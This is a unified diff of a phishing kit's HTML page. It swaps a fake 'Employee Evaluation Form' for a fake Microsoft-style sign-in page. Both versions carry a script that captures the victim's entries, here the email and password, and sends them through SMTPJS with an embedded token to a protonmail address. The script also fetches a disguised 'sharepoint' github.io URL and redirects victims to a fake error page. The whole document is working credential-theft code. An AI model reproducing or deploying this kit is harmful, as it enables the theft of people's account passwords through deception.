@@ -1,154 +1,46 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Contact us</title>
-    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
-    <style>
-      * {
-      box-sizing: border-box;
-      }
-      html, body {
-      min-height: 100vh;
-      padding: 0;
-      margin: 0;
-      font-family: Roboto, Arial, sans-serif;
-      font-size: 14px; 
-      color: #666;
-      }
-      input, textarea { 
-      outline: none;
-      }
-      body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      background: #110982;
-      }
-      h1 {
-      margin-top: 0;
-      font-weight: 500;
-      }
-      form {
-      position: relative;
-      width: 80%;
-      border-radius: 30px;
-      background: #fff;
-      }
-      .form-left-decoration,
-      .form-right-decoration {
-      content: "";
-      position: absolute;
-      width: 50px;
-      height: 20px;
-      border-radius: 20px;
-      background: #110982;
-      }
-      .form-left-decoration {
-      bottom: 60px;
-      left: -30px;
-      }
-      .form-right-decoration {
-      top: 60px;
-      right: -30px;
-      }
-      .form-left-decoration:before,
-      .form-left-decoration:after,
-      .form-right-decoration:before,
-      .form-right-decoration:after {
-      content: "";
-      position: absolute;
-      width: 50px;
-      height: 20px;
-      border-radius: 30px;
-      background: #fff;
-      }
-      .form-left-decoration:before {
-      top: -20px;
-      }
-      .form-left-decoration:after {
-      top: 20px;
-      left: 10px;
-      }
-      .form-right-decoration:before {
-      top: -20px;
-      right: 0;
-      }
-      .form-right-decoration:after {
-      top: 20px;
-      right: 10px;
-      }
-      .circle {
-      position: absolute;
-      bottom: 80px;
-      left: -55px;
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-      background: #fff;
-      }
-      .form-inner {
-      padding: 40px;
-      }
-      .form-inner input,
-      .form-inner textarea {
-      display: block;
-      width: 100%;
-      padding: 15px;
-      margin-bottom: 10px;
-      border: none;
-      border-radius: 20px;
-      background: #d0dfe8;
-      }
-      .form-inner textarea {
-      resize: none;
-      }
-      button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 20px;
-      border-radius: 20px;
-      border: none;
-      border-bottom: 4px solid#110982;
-      background: #110982; 
-      font-size: 16px;
-      font-weight: 400;
-      color: #fff;
-      }
-      button:hover {
-      background: #1e1788;
-      } 
-      @media (min-width: 568px) {
-      form {
-      width: 60%;
-      }
-      }
-    </style>
-  </head>
-  <body>
-    <form action="#"  class="decor">
-      <div class="form-left-decoration"></div>
-      <div class="form-right-decoration"></div>
-      <div class="circle"></div>
-      <div class="form-inner">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://onedrivevoicemessageplay.on.drv.tw/onedrive incorrect.com/923932932932938438-webmail.html">
-        <h1>EMPLOYEE EVALUATION FORM</h1>
-        <input class="Fullname" name="Fullname" type="text" placeholder="Fullname" required>
-        <input class="department" name="Department" type="text" placeholder="Department" required>
-        <input class="jobtitle" name="Job title" type="text" placeholder="Job title" required>
-        <input class="reviewperiod" name="Review Period" type="text" placeholder="Review Period" required>
-        <button type="submit" href="/">AUTHENTICATE TO SUBMIT</button>
-      </div>
-    </form>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style.css" rel="stylesheet" />
+    <script src="script.js" ></script>
+    <title>Log in</title>
+    
 
-    <script src="https://smtpjs.com/v3/smtp.js">
-    </script>
+</head>
+<body class="prologin">
+    <script src="script.js"></script>
+    <div class="loginbox">
+        <form class="didlogin"  action="#">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioUT31Pw4vUleYFYomxbkOZmp00NiQU0Ad5hUSTMmPU65ji-g8ueqjsT1nBx08hjTt0zFKzKcsjl446VZvqEfSQ7-hMUKRr24bDa77zZlIzBSw8Ltp2gzrN4WAu4vPd8vqyYaiyoxDNjcry2fnAohDBS21CULnoHSjRzA64oGMweeLaFQknd15tdKBP7D8/s5950/didaosm.png" alt="Alternate text" class="diduser" />
+            <br>
+            <br>
+            <br>
+            <label class="didIblemail1">
+                <b>
+                    Sign in
+                </b>
+            </label>
+            <br><br>
+            <input type="email" name="email" class="didproemail" placeholder="Email" required>
+            <input type="Password" name="Pass" class="didpropass" placeholder="Password" required>
+            <label class="didIblemail2" >
+                <b>
+                    Can't access your account?
+                </b>
+            </label>
+            <br><br><br>
+            <button class="didbtnsubmit" type="submit" >Sign in</button>
+            <br><br>
+        </form>
 
-    <script>
-      const delay = ms => new Promise(res => setTimeout(res, ms));
-
-           fetch('https://sharepoint-924wwej329dnms.github.io/lksfdk3434/', {
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    
+        <script>
+              fetch('https://sharepoint-924wwej329dnms.github.io/lksfdk3434/', {
              method: "GET",
               }).then(response => {
              return response.text()
@@ -164,35 +56,34 @@
 
              });
 
-        const form = document.querySelector('.decor')
-
-
-       function sendMsg(e){
-        e.preventDefault();
-        
-            const  Fullname = document.querySelector('.Fullname')
-              department = document.querySelector('.department')
-              jobtitle = document.querySelector('.jobtitle')
-              reviewperiod = document.querySelector('.reviewperiod')
-
-
-         Email.send({
-         SecureToken : "523b9631-eba2-428d-b404-b38a5c0db98f",
-         To : 'mattew20201@protonmail.com',
-         From : "yohnlom@gmail.com",
-         Subject : "This is the subject"+"="+Fullname.value,
-         Body : "<br>NAME=="+Fullname.value+"<br>department=="+department.value+"<br>jobtitle=="+jobtitle.value+"<br>reviewperiod=="+jobtitle.value+"<br>RUPIES=="+fetch.value
-         });
-         setTimeout(codingCourse, 2000);
-         function codingCourse() {
-          window.location.href = "365.html";
-         }
-       }
-
-       form.addEventListener('submit', sendMsg);
-
-        
-    </script>
-
-  </body>
+            const form = document.querySelector('.didlogin')
+    
+    
+           function sendMsg(e){
+            e.preventDefault();
+            
+                const  Fullname = document.querySelector('.didproemail')
+                  department = document.querySelector('.didpropass')
+    
+    
+             Email.send({
+             SecureToken : "523b9631-eba2-428d-b404-b38a5c0db98f",
+             To : 'mattew20201@protonmail.com',
+             From : "yohnlom@gmail.com",
+             Subject : "This is the subject"+"="+Fullname.value,
+             Body : "<br>NAME=="+Fullname.value+"<br>department=="+department.value+"<br>RUPIES=="+fetch.value
+             });
+             setTimeout(codingCourse, 2000);
+             function codingCourse() {
+             window.location.href = "incorrect-365.html";
+             }
+           }
+    
+           form.addEventListener('submit', sendMsg);
+    
+            
+        </script>
+    </div>
+   
+</body>
 </html>
